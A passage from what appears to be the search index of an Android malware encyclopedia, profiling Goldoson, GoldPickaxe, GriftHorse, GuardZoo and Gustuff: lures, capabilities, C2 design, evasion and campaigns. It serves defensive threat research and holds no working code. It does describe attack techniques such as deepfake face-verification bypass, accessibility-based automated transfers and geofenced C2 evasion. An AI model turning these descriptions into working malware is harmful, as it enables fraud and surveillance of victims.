scan results</li> <li>Continuous: background ad click fraud for revenue generation</li> <li>Data uploaded to a remote server controlled by the SDK developer</li> </ul>"},{"location":"malware/families/goldoson/#ad-click-fraud","title":"Ad Click Fraud","text":"<p>Goldoson loaded advertising URLs in hidden WebViews and simulated clicks on ads without user visibility. This generated fraudulent advertising revenue for the SDK operators at the expense of advertisers and users' battery and data.</p>"},{"location":"malware/families/goldoson/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/goldoson/#sdk-integration","title":"SDK Integration","text":"<p>The Goldoson SDK was distributed as a standard advertising library. Developers added it to their projects expecting legitimate ad functionality:</p> <ul> <li>Standard Android library (.aar) format</li> <li>Registered as a content provider for auto-initialization</li> <li>Minimal visible API surface for ad display</li> <li>Hidden data collection and click fraud modules activated in background</li> </ul>"},{"location":"malware/families/goldoson/#remote-configuration","title":"Remote Configuration","text":"<p>The SDK's behavior was controlled by a remote configuration server:</p> Parameter Function Collection interval How frequently device data is harvested Ad URLs Which ads to load and click Feature flags Enable/disable specific collection capabilities Target packages Which installed apps to report <p>This remote configuration allowed the operator to adjust behavior, potentially activating or deactivating data collection to evade detection during security reviews.</p>"},{"location":"malware/families/goldoson/#target-regions","title":"Target Regions","text":"Region Details South Korea Primary target, ONE store presence Global Google Play distribution reached worldwide <p>The affected apps were primarily popular with Korean users, but their Google Play presence meant global availability. The data collection capabilities operated regardless of user location.</p>"},{"location":"malware/families/goldoson/#notable-campaigns","title":"Notable Campaigns","text":"<p>2023, April: McAfee discovers Goldoson SDK embedded in 60+ Google Play apps with 100M+ downloads and additional apps on Korea's ONE store. McAfee coordinates disclosure with Google and app developers. Affected apps are either removed or updated to remove the malicious SDK.</p>"},{"location":"malware/families/goldpickaxe/","title":"GoldPickaxe","text":"<p>GoldPickaxe is an Android and iOS banking trojan from the GoldFactory threat group, a Chinese-speaking cybercrime operation that develops the broader GoldDigger malware family. First observed in 2024 as an evolution of the GoldDigger trojan (2023), GoldPickaxe introduced a novel biometric theft technique: it tricks victims into recording facial videos that are then used to create deepfake content capable of bypassing bank face-verification systems. With variants targeting both Android and iOS, cross-platform reach across Southeast Asia and expanding into Latin America and South Africa, GoldPickaxe represents a significant escalation in mobile banking fraud capabilities.</p>"},{"location":"malware/families/goldpickaxe/#overview","title":"Overview","text":"Attribute Details First Seen 2023 (GoldDigger), 2024 (GoldPickaxe) Status Active Type Banking trojan, biometric stealer Aliases GoldDigger (predecessor), GoldDiggerPlus (Android sibling) Attribution GoldFactory group (Chinese-speaking threat actors) Distribution Localized apps, social engineering, smishing"},{"location":"malware/families/goldpickaxe/#origin-and-lineage","title":"Origin and Lineage","text":"<p>The GoldFactory threat group is a Chinese-speaking cybercrime operation responsible for a family of Android banking trojans targeting Southeast Asian financial institutions. The lineage begins with GoldDigger, first documented in 2023 as a banking trojan targeting Vietnamese users.</p> <p>GoldDigger (2023): The original family member, an Android banking trojan targeting Vietnamese banks through overlay attacks and accessibility service abuse. GoldDigger established the group's operational model of targeting Southeast Asian markets with highly localized lures.</p> <p>GoldDiggerPlus (2023-2024): An enhanced Android variant that expanded the capability set beyond the original GoldDigger. It added real-time voice communication with victims through operator-initiated calls, allowing social engineering during active device compromise.</p> <p>GoldPickaxe (2024): The most technically advanced variant, introducing biometric data theft as a core capability. GoldPickaxe collects facial video recordings from victims, which operators use to generate deepfake content that bypasses facial recognition verification at banks. Notably, GoldPickaxe includes both Android and iOS variants, making it one of the few mobile banking trojan families with true cross-platform reach.</p> <p>The ESET H1 2024 Threat Report references the family under the \"GoldDigger/GoldFactory\" designation, tracking its evolution and expanding geographic scope.</p>"},{"location":"malware/families/goldpickaxe/#distribution","title":"Distribution","text":"Vector Details Localized apps Malicious apps disguised as local government or utility services Social engineering Victims contacted directly and guided to install apps Smishing SMS messages directing victims to download pages iOS profiles Enterprise or MDM profiles used to sideload iOS variants <p>GoldPickaxe distribution relies heavily on social engineering tailored to specific markets. In Thailand, lures impersonate government services such as the Digital Pension app. In Vietnam, distribution uses local utility and banking app impersonations. The operators contact victims directly through messaging platforms, posing as government officials or bank representatives, and guide them through the installation process.</p> <p>The iOS distribution is particularly notable. Since iOS does not allow sideloading in the same way Android does, the operators use enterprise distribution profiles or mobile device management (MDM) configurations to install the malicious app outside the App Store. Victims are socially engineered into accepting the profile installation, which then enables the trojan deployment.</p>"},{"location":"malware/families/goldpickaxe/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/goldpickaxe/#core-features","title":"Core Features","text":"Capability Implementation Facial biometric theft Prompts victim to record facial video, exfiltrates for deepfake creation Identity document theft Captures photos of government-issued ID documents SMS interception Reads and exfiltrates SMS messages for OTP and 2FA bypass Overlay attacks WebView-based inject screens for credential harvesting Device information collection Harvests device model, phone number, and installed apps Proxy traffic Routes traffic through victim device to mask operator's origin"},{"location":"malware/families/goldpickaxe/#biometric-theft-and-deepfake-bypass","title":"Biometric Theft and Deepfake Bypass","text":"<p>GoldPickaxe's signature capability is its approach to defeating facial recognition verification. Many Southeast Asian banks, particularly in Thailand and Vietnam, have implemented face-verification systems that require customers to record a short video of their face when initiating high-value transactions or account changes. GoldPickaxe exploits this by:</p> <ol> <li>Displaying a convincing prompt within the malicious app requesting the victim to record a facial video, framed as an identity verification step</li> <li>Capturing the recorded video and exfiltrating it to the operator's infrastructure</li> <li>Using AI-powered face-swapping tools to generate deepfake videos from the stolen biometric data</li> <li>Presenting the deepfake video to the bank's face-verification system to authorize fraudulent transactions</li> </ol> <p>This technique is fundamentally different from how other banking trojans like Chameleon interact with biometric security. Chameleon disables biometric authentication on the device (forcing a fallback to PIN or password, which it captures through keylogging), while GoldPickaxe steals the biometric data itself and uses it to impersonate the victim at the bank's verification layer. The distinction is between bypassing biometric checks locally versus defeating them at the server side through stolen biometric material.</p>"},{"location":"malware/families/goldpickaxe/#identity-document-theft","title":"Identity Document Theft","text":"<p>Beyond facial biometrics, GoldPickaxe also prompts victims to photograph their government-issued ID documents. Combined with the facial video, this gives operators a comprehensive identity package: a face video for deepfake generation, document photos for identity verification questions, and personal details extracted from the documents.</p>"},{"location":"malware/families/goldpickaxe/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/goldpickaxe/#cross-platform-architecture","title":"Cross-Platform Architecture","text":"<p>GoldPickaxe is one of the rare mobile banking trojan families with functional variants on both Android and iOS:</p> Platform Distribution Method Key Differences Android Sideloaded APKs, localized app stores Full feature set including accessibility service abuse iOS Enterprise profiles, MDM configurations, TestFlight (initially) More limited due to iOS restrictions, focused on biometric and document theft <p>The iOS variant was initially distributed through Apple's TestFlight beta testing platform before Apple removed it. The operators then shifted to enterprise distribution profiles and MDM-based installation.</p>"},{"location":"malware/families/goldpickaxe/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Localized targeting Highly regional lures make samples harder to discover outside target geographies Social engineering dependency Installation requires active victim participation, limiting automated sandbox detection Enterprise profile abuse iOS distribution through profiles rather than App Store avoids standard app review"},{"location":"malware/families/goldpickaxe/#target-regions","title":"Target Regions","text":"Period Primary Targets 2023 Vietnam (GoldDigger) 2023-2024 Vietnam, Thailand (GoldDiggerPlus, GoldPickaxe) 2024 Expanded to Latin America, South Africa <p>The initial focus on Vietnamese and Thai banking users reflects the group's expertise in Southeast Asian markets. The adoption of facial verification by banks in these countries created the specific opportunity that GoldPickaxe was designed to exploit. Expansion into Latin America and South Africa follows the trend of successful mobile banking trojan operations extending beyond their initial geographic focus once the tooling matures.</p>"},{"location":"malware/families/goldpickaxe/#notable-campaigns","title":"Notable Campaigns","text":"<p>2023: GoldDigger campaigns targeted Vietnamese banking users through localized app lures, establishing the GoldFactory group's operational footprint in Southeast Asia.</p> <p>Early 2024: GoldPickaxe emerged with facial biometric theft capabilities targeting Thai and Vietnamese banks. The iOS variant was distributed through TestFlight before Apple intervened, after which operators pivoted to enterprise profile distribution.</p> <p>Mid-2024: The ESET H1 2024 Threat Report documented the GoldDigger/GoldFactory family's evolution and expanding scope, noting the biometric theft technique as a significant development in mobile banking fraud.</p> <p>Late 2024: Campaigns expanded beyond Southeast Asia into Latin American and South African markets, targeting banking customers in regions where facial verification is gaining adoption.</p>"},{"location":"malware/families/goldpickaxe/#related-families","title":"Related Families","text":"Family Relationship GoldDigger Direct predecessor within the GoldFactory family. Android banking trojan targeting Vietnamese banks, lacking biometric theft capability. GoldDiggerPlus Android sibling variant with enhanced features including real-time voice communication with victims during active compromise. Chameleon Both families interact with biometric security, but through opposite approaches. Chameleon disables biometric authentication locally to force PIN/password fallback. GoldPickaxe steals biometric data to defeat server-side face verification through deepfakes."},{"location":"malware/families/grifthorse/","title":"GriftHorse","text":"<p>GriftHorse is a premium SMS fraud trojan that infected over 10 million Android devices across 70+ countries between November 2020 and September 2021, generating estimated revenue in the hundreds of millions of euros. Discovered by Zimperium zLabs, the campaign stood out for its scale, geographic reach, and operational discipline: operators used geolocation-based targeting to serve country-specific premium service numbers, avoided hardcoded URLs, rotated domains, and built their apps with Apache Cordova to enable seamless silent updates.</p>"},{"location":"malware/families/grifthorse/#overview","title":"Overview","text":"Attribute Details First Seen November 2020 Last Seen September 2021 (Google Play removal) Type Premium SMS subscription fraud Attribution Unknown Aliases GriftHorse"},{"location":"malware/families/grifthorse/#origin-and-lineage","title":"Origin and Lineage","text":"<p>GriftHorse has no known code lineage to other Android malware families. It was purpose-built for premium SMS enrollment at scale. The Zimperium zLabs team discovered the campaign through automated alerts from their z9 on-device detection engine. Forensic analysis placed the campaign's start date at November 2020, meaning it operated undetected for approximately 10 months before public disclosure.</p> <p>The operators showed significant investment in infrastructure and distribution. Over 200 trojanized apps were submitted to Google Play and third-party stores, each functional enough to accumulate downloads without raising review flags. The campaign's financial model was straightforward: subscribe victims to premium SMS services charging approximately 36 euros per month, charged directly to their phone bill.</p>"},{"location":"malware/families/grifthorse/#distribution","title":"Distribution","text":"<p>GriftHorse used two distribution channels:</p> Channel Details Google Play 200+ trojanized apps across multiple categories Third-party stores Same apps distributed through alternative app markets"},{"location":"malware/families/grifthorse/#app-categories","title":"App Categories","text":"<p>The trojanized apps spanned a wide range of categories to maximize installs:</p> Category Examples Tools/Utilities File managers, compasses, GPS tools Entertainment Horoscope apps, wallpapers Dating Chat and dating simulation apps Music Ringtone and audio apps Games Casual puzzle and arcade games Productivity Translators, calculators Communication Call recorders, messaging <p>The apps were functional. Users received a working utility while the fraud operated silently. This dual-purpose design kept ratings positive and avoided mass uninstalls that would trigger Play Store review.</p>"},{"location":"malware/families/grifthorse/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/grifthorse/#fraud-flow","title":"Fraud Flow","text":"Step Action 1 User installs trojanized app from Google Play or third-party store 2 App begins displaying pop-up alerts claiming the user has won a prize 3 Pop-ups repeat at minimum 5 times per hour until the user interacts 4 User taps alert, app collects device IP for geolocation 5 Based on IP geolocation, app serves a country-specific premium service page 6 Page prompts user to enter phone number for \"verification\" 7 Submitted phone number is enrolled in a premium SMS service (~36 EUR/month) 8 Charges appear on victim's phone bill <p>The social engineering relied on persistence rather than sophistication. The pop-ups were intentionally aggressive, appearing repeatedly until the user engaged, betting that a fraction of annoyed users would follow through.</p>"},{"location":"malware/families/grifthorse/#geolocation-targeting","title":"Geolocation Targeting","text":"<p>GriftHorse's operators served different premium service numbers based on the victim's IP-derived country. This meant:</p> <ul> <li>Each country received premium numbers that actually worked with local carriers</li> <li>No single premium service number appeared across all regions, complicating detection</li> <li>The payload URL was not hardcoded but dynamically served, so static analysis of the APK revealed nothing malicious</li> </ul>"},{"location":"malware/families/grifthorse/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/grifthorse/#framework","title":"Framework","text":"<p>GriftHorse apps were built with Apache Cordova, a cross-platform mobile development framework that wraps web technologies (HTML5, CSS3, JavaScript) in a native container. The choice of Cordova provided several operational advantages:</p> Advantage Details Cross-platform Same codebase runs on Android (and could be adapted for iOS) Silent updates Cordova's web layer can be updated without pushing an app store update Rapid development Web technologies allow fast iteration across 200+ app variants InAppBrowser Cordova's InAppBrowser plugin opens subscription pages within the app context"},{"location":"malware/families/grifthorse/#c2-architecture","title":"C2 Architecture","text":"Component Details Stage 1 App contains encrypted C2 URL in its assets Decryption AES decryption to recover stage-2 C2 URL Stage 2 GET request to stage-2 URL retrieves the premium service page URL Serving Premium page URL is country-specific, resolved via IP geolocation Display Page opened in Cordova's InAppBrowser <p>The operators avoided hardcoding any premium service URLs in the APK. The two-stage C2 retrieval with AES encryption and IP-based filtering meant the malicious behavior was invisible to static analysis and only triggered for users in targeted regions.</p>"},{"location":"malware/families/grifthorse/#domain-infrastructure","title":"Domain Infrastructure","text":"<p>Operators rotated domains frequently and avoided reusing domains across campaigns. No single domain appeared in multiple app variants, which made domain-based blocklisting ineffective as a broad countermeasure. The IP-based geolocation filtering also meant security researchers in non-targeted countries would receive benign responses from the C2.</p>"},{"location":"malware/families/grifthorse/#evasion","title":"Evasion","text":"Technique Purpose AES-encrypted C2 URL Prevents static extraction of server addresses IP geolocation filtering Non-targeted regions receive no malicious payload Domain rotation No persistent indicators for blocklist-based detection Cordova framework Malicious logic lives in the web layer, not in Dalvik bytecode Functional apps Positive reviews and high ratings reduce suspicion No SEND_SMS permission Fraud is web-based, not through SMS API; no suspicious permissions in manifest"},{"location":"malware/families/grifthorse/#target-regions","title":"Target Regions","text":"<p>GriftHorse targeted over 70 countries. The geolocation-based serving model meant any country with carrier-billed premium SMS services was a potential target.</p> Region Selected Countries Europe UK, Germany, France, Spain, Italy, Greece, Poland, Norway, Sweden, Finland Asia India, China, Thailand, Malaysia, Indonesia, Saudi Arabia, UAE Americas US, Brazil, Canada, Argentina Africa South Africa, Nigeria, Egypt, Kenya Oceania Australia, New Zealand <p>The campaign's profitability depended on local carrier billing infrastructure. Countries where phone bill charges for premium services are common and difficult to reverse were prioritized.</p>"},{"location":"malware/families/grifthorse/#notable-campaigns","title":"Notable Campaigns","text":"<p>2020, November: GriftHorse campaign begins. Trojanized apps start appearing on Google Play and third-party stores. The operation runs silently, accumulating installs across multiple app categories and regions.</p> <p>2021, ongoing: The campaign scales to 200+ apps and 10M+ infected devices globally. Estimated revenue reaches hundreds of millions of euros at ~36 EUR per victim per month. The aggressive pop-up social engineering drives a steady conversion rate across targeted populations.</p> <p>2021, September: Zimperium zLabs publishes their discovery, revealing the full scope: 10M+ victims, 70+ countries, 200+ apps. Google verifies the findings and removes all identified apps from the Play Store. Coverage by Threatpost, Dark Reading, The Record, and Malwarebytes follows.</p> <p>2021, post-disclosure: While removed from Google Play, the apps remained available on third-party app stores. Victims already enrolled in premium services continued to be charged until they manually contacted their carrier to cancel. No arrests or infrastructure seizures have been publicly reported. Kaspersky's subscription trojan comparison documented GriftHorse's subscription mechanics alongside Joker, MobOk, and Vesub.</p>"},{"location":"malware/families/guardzoo/","title":"GuardZoo","text":"<p>GuardZoo is an Android surveillanceware operated by a Houthi-aligned threat actor, targeting military personnel across the Middle East since October 2019. Lookout disclosed the campaign in July 2024, identifying over 450 unique victim IP addresses primarily in Yemen, Saudi Arabia, Egypt, Oman, the UAE, Qatar, and Turkey. GuardZoo is built on Dendroid RAT, an open-source Android RAT whose source code was leaked publicly in 2014. The operators heavily modified Dendroid's codebase, adding over 60 new commands, replacing the original PHP web panel with a custom ASP.NET backend, and tailoring the collection priorities toward military intelligence: the malware automatically uploads all KMZ, WPT, RTE, and TRK files (map data, waypoints, routes, tracks) from the device without requiring a specific command.</p>"},{"location":"malware/families/guardzoo/#overview","title":"Overview","text":"Attribute Details First Seen October 2019 Last Seen Active as of July 2024 Status Active Type Surveillanceware, military espionage Attribution Houthi-aligned Yemeni threat actor Distribution WhatsApp, WhatsApp Business, direct browser download"},{"location":"malware/families/guardzoo/#origin-and-lineage","title":"Origin and Lineage","text":"<p>GuardZoo descends directly from Dendroid RAT, a commodity Android RAT that was leaked online in 2014. Dendroid offered basic remote access capabilities and was widely used by low-sophistication actors due to its open-source availability. GuardZoo's operators took the Dendroid codebase and performed extensive modifications: unused functions were stripped out, new surveillance commands were added (expanding the command set to over 60), and the entire C2 backend was rebuilt.</p> <p>The most significant infrastructure change was replacing Dendroid's original PHP web panel with a custom C2 built on ASP.NET, served through IIS 10. Despite this rebuild, the C2 URLs retain \".php\" extensions in their paths, a remnant of the Dendroid heritage. Communication between the implant and C2 occurs over HTTPS, though the request body data is transmitted in cleartext.</p> <p>Lookout had been tracking Dendroid RAT since before 2022, which led to the identification of GuardZoo as a distinct fork with purpose-built military intelligence collection capabilities.</p>"},{"location":"malware/families/guardzoo/#distribution","title":"Distribution","text":"<p>GuardZoo spreads primarily through WhatsApp and WhatsApp Business, with secondary distribution via direct browser downloads. The lure apps use military and religious themes designed to appeal to armed forces personnel in the target region.</p> Vector Details WhatsApp / WhatsApp Business Primary distribution channel; APKs shared in chats and groups Direct browser download Secondary vector; victims directed to download pages Military-themed lures Apps named \"Constitution of the Armed Forces,\" \"Limited, Commander and Staff,\" \"Restructuring of the New Armed Forces\" Religious-themed lures Prayer and Islamic content apps used as secondary themes E-book lures Apps disguised as military reference e-books"},{"location":"malware/families/guardzoo/#attack-flow","title":"Attack Flow","text":"<ol> <li>Target receives a WhatsApp message containing or linking to a military-themed app (training manuals, armed forces reference materials, or religious content)</li> <li>Target downloads and installs the APK</li> <li>GuardZoo connects to the C2 server and registers the device</li> <li>By default, the malware immediately begins uploading all KMZ, WPT, RTE, and TRK files created since June 24, 2017</li> <li>The operator issues additional commands from the 60+ command set for targeted data collection</li> <li>The operator can deploy additional malware to the device through GuardZoo's download capability</li> </ol> <p>The WhatsApp distribution is particularly effective in the target environment. Military personnel in the region commonly share documents and apps through WhatsApp groups, making a military-themed app shared by a colleague or in a unit group chat a highly credible lure.</p>"},{"location":"malware/families/guardzoo/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/guardzoo/#core-features","title":"Core Features","text":"Capability Implementation Map/GPS file collection Automatically uploads KMZ, WPT, RTE, TRK files (waypoints, routes, tracks, map overlays) created since June 2017 Photo exfiltration Collects photos from the device Document theft Extracts documents and files from storage Location tracking Captures device GPS coordinates Device profiling Reports device model, cellular carrier, Wi-Fi configuration Additional malware deployment Can download and install further payloads on the compromised device Over 60 C2 commands Extensive remote control via custom command set"},{"location":"malware/families/guardzoo/#military-intelligence-focus","title":"Military Intelligence Focus","text":"<p>The automatic collection of mapping files is GuardZoo's defining feature from an intelligence perspective. KMZ files (Keyhole Markup Language, compressed) contain geographic annotations, map overlays, and location markers. WPT (waypoint), RTE (route), and TRK (track) files store GPS navigation data. For military personnel, these files represent operational planning data: patrol routes, checkpoint locations, base coordinates, and movement patterns.</p> <p>The default collection threshold of files created since June 24, 2017 means GuardZoo sweeps up years of accumulated geographic data on first infection, providing the operator with historical military movement patterns in addition to current operational data.</p>"},{"location":"malware/families/guardzoo/#c2-architecture","title":"C2 Architecture","text":"Component Details Backend Custom ASP.NET application on IIS 10 Protocol HTTPS (transport encryption), cleartext request body Legacy artifacts URL paths retain \".php\" extensions from Dendroid heritage Command set Over 60 distinct commands <p>The cleartext request body over HTTPS means that while the transport layer is encrypted, the data structure itself is not obfuscated. Any operator with access to the C2 server sees raw data. This suggests the operators prioritized functional C2 over layered encryption, consistent with the modified commodity RAT approach.</p>"},{"location":"malware/families/guardzoo/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/guardzoo/#dendroid-modifications","title":"Dendroid Modifications","text":"<p>GuardZoo's operators made substantial changes to the Dendroid RAT source:</p> Aspect Dendroid RAT (Original) GuardZoo (Modified) C2 backend PHP web panel Custom ASP.NET on IIS 10 Command set Basic RAT commands Over 60 commands Auto-collection None Automatic KMZ/WPT/RTE/TRK upload Unused functions Full Dendroid feature set Stripped to reduce footprint Target profile Generic Military personnel"},{"location":"malware/families/guardzoo/#file-extension-targeting","title":"File Extension Targeting","text":"<p>The automatic collection targets specific file extensions used by GPS and mapping applications:</p> Extension Data Type KMZ Google Earth data (compressed KML), contains placemarks, overlays, geographic annotations WPT Waypoint files, GPS coordinate markers for specific locations RTE Route files, ordered sequences of waypoints defining a path TRK Track files, recorded GPS movement logs showing actual traveled paths <p>These file types are commonly generated by military GPS devices, mapping applications, and navigation software. Collecting them provides the operator with both planned operations (routes, waypoints) and historical movements (tracks).</p>"},{"location":"malware/families/guardzoo/#target-regions","title":"Target Regions","text":"Region Details Yemen Primary target, highest concentration of victims Saudi Arabia Significant number of military personnel targeted Egypt Military targets Oman Military targets UAE Military targets Qatar Military targets Turkey Military targets <p>Lookout identified over 450 victim IP addresses across these countries, with the majority located in Yemen. The targeting pattern aligns with Houthi intelligence priorities: the Yemeni civil war places Houthi forces against a Saudi-led coalition that includes personnel from all the listed countries. Many identified victims appear to be members of pro-Hadi (anti-Houthi) forces.</p>"},{"location":"malware/families/guardzoo/#notable-campaigns","title":"Notable Campaigns","text":"<p>October 2019: GuardZoo operations begin. The campaign starts with military-themed lure apps distributed through WhatsApp to armed forces personnel in Yemen and neighboring countries.</p> <p>2019-2024: The campaign runs continuously for nearly five years, accumulating over 450 victims across seven Middle Eastern countries. Distribution relies on WhatsApp sharing within military circles, with lure apps regularly updated to match current military and religious themes.</p> <p>July 2024: Lookout publicly discloses GuardZoo, detailing the Dendroid RAT lineage, Houthi attribution, military targeting, and automatic GPS/mapping file collection. The research reveals one of the longest-running mobile espionage campaigns attributed to a non-state conflict actor.</p>"},{"location":"malware/families/guardzoo/#related-families","title":"Related Families","text":"<p>GuardZoo's lineage from Dendroid RAT places it in the category of modified open-source tools repurposed for targeted operations. NGate follows a similar pattern, repurposing the academic NFCGate tool for criminal use. SpyNote represents another case where a publicly available RAT builder has been adopted by actors ranging from script kiddies to focused espionage operators.</p> <p>GuardZoo's military-focused surveillance capabilities place it alongside PJobRAT, which also targets military personnel with fake apps distributed through social channels. Both families rely on social engineering for initial access, target specific professional communities, and prioritize intelligence collection over financial fraud. The key difference is GuardZoo's sustained five-year campaign duration, which far exceeds PJobRAT's operational windows.</p> <p>In terms of espionage capability, GuardZoo operates below the level of commercial spyware like Pegasus or Predator, which use exploit chains for zero-click or one-click installation. GuardZoo compensates with targeted social engineering through trusted channels (WhatsApp groups within military units), achieving access through trust rather than technical exploitation. The approach resembles AridSpy's social engineering model, where trojanized functional apps are used to gain access to specific communities.</p>"},{"location":"malware/families/gustuff/","title":"Gustuff","text":"<p>Gustuff was an Android banking trojan that pioneered Automated Transfer System (ATS) fraud through accessibility services before the technique became an industry standard. Built as an evolution of the AndyBot malware by a Russian-speaking actor known as \"Bestoffer,\" it targeted 100+ banking apps and 32 cryptocurrency wallets across the US, Europe, and Australia. Gustuff's ATS implementation, which auto-filled transfer forms inside legitimate banking apps, predated the widespread adoption of this technique by families like Anatsa and Xenomorph by several years.</p>"},{"location":"malware/families/gustuff/#overview","title":"Overview","text":"Attribute Details First Seen April 2018 Last Seen ~2020 Status Inactive Type Banking trojan, ATS fraud Aliases AndyBot (predecessor) Attribution \"Bestoffer,\" Russian-speaking actor Distribution SMS with links to fake APKs"},{"location":"malware/families/gustuff/#vendor-names","title":"Vendor Names","text":"Vendor Name Group-IB Gustuff Cisco Talos Gustuff SonicWall AndroidGustuff ESET Android/Spy.Banker Kaspersky Trojan-Banker.AndroidOS.Gustuff Trend Micro AndroidOS_Gustuff Microsoft Trojan:AndroidOS/Banker"},{"location":"malware/families/gustuff/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Gustuff first appeared on Russian-speaking underground forums in April 2018 as a subscription-based service priced at $800/month. Its author, operating under the handle \"Bestoffer,\" marketed it as an upgraded version of AndyBot, a banking trojan that had been targeting Android devices since November 2017. Where AndyBot relied on conventional web fakes to steal credentials, Gustuff introduced the ATS engine that could script transfers directly inside the real banking app's UI.</p> <p>Group-IB's Threat Intelligence team published the first detailed analysis in March 2019, highlighting the scale of Gustuff's target list and the novelty of its ATS approach. At the time, most Android banking trojans relied on overlay attacks to capture credentials, then required manual operator action to perform transfers from separate devices. Gustuff automated the entire chain on the victim's device.</p> <p>The malware saw active development through 2019, with Cisco Talos documenting a significant v2 update in October 2019 that rearchitected command handling, removed hardcoded target lists, and introduced JavaScript-based scripting. Activity declined through 2020 as newer families adopted and refined similar techniques.</p>"},{"location":"malware/families/gustuff/#distribution","title":"Distribution","text":"<p>Gustuff relied on SMS-based distribution, sending messages containing links to malicious APK files. The malware harvested contact lists from infected devices to propagate further, creating a self-spreading mechanism.</p> Campaign Vector Disguise Source Early 2019 SMS Generic banking/utility apps Group-IB April 2019 SMS Australian financial service apps Cisco Talos June 2019 SMS, social media Instagram, social media apps SonicWall October 2019 SMS Fake app updates Cisco Talos <p>SonicWall documented a campaign where Gustuff disguised itself as Instagram and other social media apps, using icons identical to the legitimate applications to deceive users during installation.</p>"},{"location":"malware/families/gustuff/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/gustuff/#version-1-2018-2019","title":"Version 1 (2018-2019)","text":"Capability Implementation ATS fraud Accessibility service auto-fills transfer forms in banking apps Overlay attacks Web fakes loaded over legitimate apps to steal credentials SMS interception Read, send, hide SMS for OTP theft Contact harvesting Exfiltrate contacts for SMS-based propagation Push notifications Display fake notifications to lure users into targeted apps Crypto wallet targeting Overlays for 32 cryptocurrency apps including Coinbase, BitPay, Bitcoin Wallet Anti-AV Maintained list of AV apps to block/disable Google Protect bypass Disable Google Play Protect on infected devices"},{"location":"malware/families/gustuff/#version-2-october-2019","title":"Version 2 (October 2019)","text":"<p>Cisco Talos's analysis of the v2 update revealed substantial architectural changes:</p> Capability Implementation JavaScript scripting engine WebChromeClient with JS interface for dynamic command execution Dynamic target loading Target app list loaded from C2 during activation rather than hardcoded Dynamic WebView injection C2 can push WebView overlays for arbitrary domains on demand Command tracking Each C2 command assigned unique ID for execution state reporting Reduced static footprint No hardcoded package names, lowering detection by static scanners AV list dynamic loading Anti-AV target list fetched during activation cycle <p>The JavaScript scripting engine was a notable advancement. By injecting a JavaScript interface into a WebView with filesystem access, operators could execute arbitrary automation scripts, combining the malware's internal commands with the flexibility of JavaScript.</p>"},{"location":"malware/families/gustuff/#ats-implementation","title":"ATS Implementation","text":"<p>Gustuff's ATS engine was its defining feature. The process:</p> <ol> <li>Victim opens legitimate banking app and authenticates</li> <li>Malware detects the active session via accessibility service monitoring</li> <li>Uses <code>ACTION_SET_TEXT</code> (Android 5.0+) or clipboard injection (older versions) to fill transfer fields</li> <li>Navigates the banking app's UI through accessibility gestures</li> <li>Submits the transfer using C2-provided recipient and amount data</li> <li>Captures and uses SMS OTP codes to authorize the transaction</li> </ol> <p>This on-device approach bypassed \"new device\" fraud checks, since the transfer originated from the victim's enrolled device within an authenticated session.</p>"},{"location":"malware/families/gustuff/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/gustuff/#c2-communication","title":"C2 Communication","text":"<p>The C2 protocol used HTTP-based polling at predetermined intervals. The bot registered with the C2 on first launch, sending device fingerprint data. The C2 responded to polls with either \"ok\" (no pending commands) or a command payload.</p> <p>Key C2 commands:</p> Command Action <code>checkApps</code> Receive target application list during activation <code>interactive</code> Use accessibility API to interact with banking app UI for ATS <code>script</code> Execute JavaScript via WebChromeClient interface <code>upload</code> Exfiltrate files from device <code>sms</code> Send SMS from victim device <code>push</code> Display push notification to lure user <code>openApp</code> Launch specified app to trigger overlay or ATS <p>In v2, commands related to SOCKS proxy functionality were removed entirely, indicating a strategic shift toward ATS-only fraud rather than proxying device traffic.</p>"},{"location":"malware/families/gustuff/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Heavy obfuscation Packed and obfuscated to evade static analysis Anti-VM checks Detects emulator environments through hardware property checks Dynamic configuration Target lists, AV lists, and injects fetched from C2 rather than bundled Google Play Protect suppression Programmatically disables Play Protect on victim device"},{"location":"malware/families/gustuff/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Gustuff's target list was extensive, covering major financial institutions and cryptocurrency services globally.</p> Region Country Banking Apps North America United States 27 apps (Bank of America, Wells Fargo, Capital One, J.P. Morgan, TD Bank, PNC Bank) Europe Poland 16 apps Europe Germany 9 apps Asia-Pacific Australia 10 apps Asia-Pacific India 8 apps <p>Beyond banking, Gustuff targeted:</p> <ul> <li>32 cryptocurrency wallets: Coinbase, BitPay, Cryptopay, Bitcoin Wallet</li> <li>Payment systems: PayPal, Western Union, Revolut</li> <li>Marketplaces: eBay, Walmart</li> <li>Messaging apps: WhatsApp, Skype</li> </ul> <p>Cisco Talos reported that the Australian-focused campaign also attempted to target the Australian Government's myGov portal, expanding beyond pure financial theft to credential harvesting for government services.</p>"},{"location":"malware/families/gustuff/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2019: Group-IB published their initial disclosure, documenting Gustuff's capability to target 100+ banking apps and 32 cryptocurrency wallets. The analysis highlighted the ATS mechanism as a significant evolution beyond traditional overlay-based credential theft.</p> <p>April 2019: Cisco Talos identified an active campaign specifically targeting Australian financial institutions and digital currency wallets. The campaign also targeted the Australian Government's myGov portal, marking an expansion into government credential theft.</p> <p>June 2019: SonicWall documented Gustuff spreading under the disguise of social media apps, including samples mimicking Instagram with pixel-identical app icons.</p> <p>October 2019: Cisco Talos published their v2 analysis, detailing the JavaScript scripting engine, dynamic target loading, and command execution tracking system that represented a substantial architectural overhaul from the original version.</p>"},{"location":"malware/families/harly/","title":"Harly","text":"<p>Harly is a subscription fraud trojan distributed through the Google Play Store, identified and named by Kaspersky in 2022. With over 190 infected apps and a conservative 4.8 million downloads, Harly operates in the same toll fraud space as Joker but uses a distinct technical approach: the entire malicious payload is embedded within the APK rather than downloaded from a C2 server. The family is notable for using Rust and Go native libraries as payload loaders, a technique uncommon in Android toll fraud malware.</p>"},{"location":"malware/families/harly/#overview","title":"Overview","text":"Attribute Details First Seen 2020 Status Active Type Subscription fraud, toll fraud Attribution Unknown Aliases Harly 